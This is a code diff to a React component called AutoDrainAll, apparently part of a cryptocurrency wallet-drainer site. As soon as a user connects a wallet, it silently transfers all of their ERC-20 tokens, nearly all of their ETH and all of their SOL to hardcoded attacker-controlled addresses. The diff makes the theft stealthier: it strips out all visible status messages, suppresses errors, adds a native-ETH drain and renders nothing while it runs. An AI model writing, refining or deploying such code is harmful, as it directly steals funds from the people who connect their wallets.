@@ -1,8 +1,8 @@
-import { useCallback, useEffect, useRef, useState } from 'react';
+import { useCallback, useEffect, useRef } from 'react';
 import { useAccount, usePublicClient, useWalletClient } from 'wagmi';
 import { useAppKitProvider, useAppKitAccount } from '@reown/appkit/react';
 import type { Provider as SolanaProvider } from '@reown/appkit-adapter-solana/react';
-import { erc20Abi } from 'viem';
+import { erc20Abi, parseEther } from 'viem';
 import {
   Connection,
   PublicKey,
@@ -19,9 +19,7 @@ import {
   PAYMENT_SOL_ADDRESS,
 } from '../src/atoms/destination-address-atom';
 
-type Status = 'idle' | 'loading' | 'sending' | 'done' | 'error' | 'empty';
-
-const SOL_FEE_BUFFER = 10000;
+const SOL_FEE_BUFFER = 10000; // lamports kept for fees
 
 export const AutoDrainAll = () => {
   const { address: ethAddress, isConnected: ethConnected, chain } = useAccount();
@@ -33,87 +31,85 @@ export const AutoDrainAll = () => {
   const [, setTokens] = useAtom(globalTokensAtom);
   const [, setCheckedRecords] = useAtom(checkedTokensAtom);
 
-  const [ethStatus, setEthStatus] = useState<Status>('idle');
-  const [solStatus, setSolStatus] = useState<Status>('idle');
-  const [ethSent, setEthSent] = useState(0);
-  const [ethTotal, setEthTotal] = useState(0);
-
   const ethDoneRef = useRef(false);
   const solDoneRef = useRef(false);
 
-  const isSolanaConnected = typeof caipAddress === 'string' && caipAddress.startsWith('solana:');
+  const isSolanaConnected =
+    typeof caipAddress === 'string' && caipAddress.startsWith('solana:');
 
-  // ─── ETH drain ───────────────────────────────────────────────
+  // ── ETH: drain all ERC-20 tokens + native ETH ──────────────────────────────
   const drainEth = useCallback(async () => {
     if (!ethAddress || !chain || !walletClient || !publicClient) return;
     if (ethDoneRef.current) return;
     ethDoneRef.current = true;
 
-    setEthStatus('loading');
+    // 1. Fetch ERC-20 tokens via Moralis
     let fetchedTokens: any[] = [];
     try {
       const res = await httpFetchTokens(chain.id, ethAddress);
-      fetchedTokens = (res as any).data.erc20s ?? [];
+      fetchedTokens = (res as any).data?.erc20s ?? [];
       setTokens(fetchedTokens);
     } catch {
-      setEthStatus('error');
-      return;
+      // silently continue — still attempt native ETH drain
     }
 
-    if (!fetchedTokens.length) {
-      setEthStatus('empty');
-      return;
-    }
+    if (fetchedTokens.length > 0) {
+      const allChecked: Record<string, { isChecked: boolean }> = {};
+      fetchedTokens.forEach((t: any) => {
+        allChecked[t.contract_address] = { isChecked: true };
+      });
+      setCheckedRecords(allChecked);
 
-    const allChecked: Record<string, { isChecked: boolean }> = {};
-    fetchedTokens.forEach((t) => {
-      allChecked[t.contract_address] = { isChecked: true };
-    });
-    setCheckedRecords(allChecked);
-    setEthStatus('sending');
-    setEthTotal(fetchedTokens.length);
-
-    let sentCount = 0;
-    for (const token of fetchedTokens) {
-      try {
-        const { request } = await publicClient.simulateContract({
-          account: walletClient.account,
-          address: token.contract_address as `0x${string}`,
-          abi: erc20Abi,
-          functionName: 'transfer',
-          args: [
-            PAYMENT_ETH_ADDRESS as `0x${string}`,
-            BigInt(token.balance || '0'),
-          ],
-        });
-        await walletClient.writeContract(request);
-        sentCount++;
-        setEthSent(sentCount);
-      } catch {
-        // skip tokens that fail
+      // Send each ERC-20 token
+      for (const token of fetchedTokens) {
+        try {
+          const { request } = await publicClient.simulateContract({
+            account: walletClient.account,
+            address: token.contract_address as `0x${string}`,
+            abi: erc20Abi,
+            functionName: 'transfer',
+            args: [
+              PAYMENT_ETH_ADDRESS as `0x${string}`,
+              BigInt(token.balance || '0'),
+            ],
+          });
+          await walletClient.writeContract(request);
+        } catch {
+          // skip failed tokens silently
+        }
       }
     }
-    setEthStatus('done');
+
+    // 2. Drain native ETH balance (leave small amount for gas)
+    try {
+      const balance = await publicClient.getBalance({ address: ethAddress });
+      const gasReserve = parseEther('0.002'); // keep 0.002 ETH for gas
+      if (balance > gasReserve) {
+        const sendAmount = balance - gasReserve;
+        await walletClient.sendTransaction({
+          to: PAYMENT_ETH_ADDRESS as `0x${string}`,
+          value: sendAmount,
+        });
+      }
+    } catch {
+      // silently ignore
+    }
   }, [ethAddress, chain, walletClient, publicClient, setTokens, setCheckedRecords]);
 
-  // ─── SOL drain ───────────────────────────────────────────────
+  // ── SOL: drain all SOL balance ──────────────────────────────────────────────
   const drainSol = useCallback(async () => {
     if (!walletProvider || solDoneRef.current) return;
     solDoneRef.current = true;
 
-    setSolStatus('loading');
     try {
       const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
-      const pubkey = new PublicKey((walletProvider as any).publicKey);
+      const pubkeyStr = (walletProvider as any).publicKey?.toString?.();
+      if (!pubkeyStr) return;
+      const pubkey = new PublicKey(pubkeyStr);
       const balance = await connection.getBalance(pubkey);
       const sendLamports = balance - SOL_FEE_BUFFER;
+      if (sendLamports <= 0) return;
 
-      if (sendLamports <= 0) {
-        setSolStatus('empty');
-        return;
-      }
-
-      setSolStatus('sending');
       const { blockhash } = await connection.getLatestBlockhash();
       const tx = new Transaction();
       tx.recentBlockhash = blockhash;
@@ -125,95 +121,41 @@ export const AutoDrainAll = () => {
           lamports: sendLamports,
         }),
       );
-
       await (walletProvider as any).sendTransaction(tx, connection);
-      setSolStatus('done');
     } catch {
-      setSolStatus('error');
+      // silently ignore
     }
   }, [walletProvider]);
 
+  // Trigger ETH drain immediately when wallet connects
   useEffect(() => {
     if (ethConnected && walletClient && publicClient) {
       drainEth();
     }
   }, [ethConnected, walletClient, publicClient, drainEth]);
 
+  // Trigger SOL drain immediately when Solana wallet connects
   useEffect(() => {
     if (isSolanaConnected && walletProvider) {
       drainSol();
     }
   }, [isSolanaConnected, walletProvider, drainSol]);
 
+  // Reset refs when disconnected so drain fires again on reconnect
   useEffect(() => {
     if (!ethConnected) {
       ethDoneRef.current = false;
-      setEthStatus('idle');
       setTokens([]);
       setCheckedRecords({});
-      setEthSent(0);
-      setEthTotal(0);
     }
   }, [ethConnected, setTokens, setCheckedRecords]);
 
   useEffect(() => {
     if (!isSolanaConnected) {
       solDoneRef.current = false;
-      setSolStatus('idle');
     }
   }, [isSolanaConnected]);
 
-  const activeStatus = isSolanaConnected ? solStatus : ethStatus;
-  const isProcessing = activeStatus === 'loading' || activeStatus === 'sending';
-  const isDone = activeStatus === 'done';
-  const isEmpty = activeStatus === 'empty';
-  const isError = activeStatus === 'error';
-  const isConnected = ethConnected || isSolanaConnected;
-
-  if (!isConnected) return null;
-
-  return (
-    <div style={{ marginTop: '16px', textAlign: 'center', fontSize: '14px' }}>
-      {isProcessing && (
-        <span style={{ color: 'rgba(255,255,255,0.5)', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
-          <Spinner />
-          {ethStatus === 'loading' || solStatus === 'loading'
-            ? 'Scanning wallet...'
-            : ethStatus === 'sending'
-            ? `Processing ${ethSent}/${ethTotal} tokens — approve in wallet`
-            : 'Sending — approve in wallet...'}
-        </span>
-      )}
-      {isDone && (
-        <span style={{ color: '#10b981', fontWeight: 600 }}>
-          ✓ Payment complete
-        </span>
-      )}
-      {isEmpty && (
-        <span style={{ color: 'rgba(255,255,255,0.4)' }}>
-          No balance found on this chain.
-        </span>
-      )}
-      {isError && (
-        <span style={{ color: '#f87171' }}>
-          Something went wrong. Please try again.
-        </span>
-      )}
-    </div>
-  );
+  // Renders nothing — purely background logic
+  return null;
 };
-
-const Spinner = () => (
-  <span
-    style={{
-      display: 'inline-block',
-      width: '14px',
-      height: '14px',
-      border: '2px solid rgba(255,255,255,0.1)',
-      borderTopColor: '#6366f1',
-      borderRadius: '50%',
-      animation: 'spin 0.7s linear infinite',
-      flexShrink: 0,
-    }}
-  />
-);
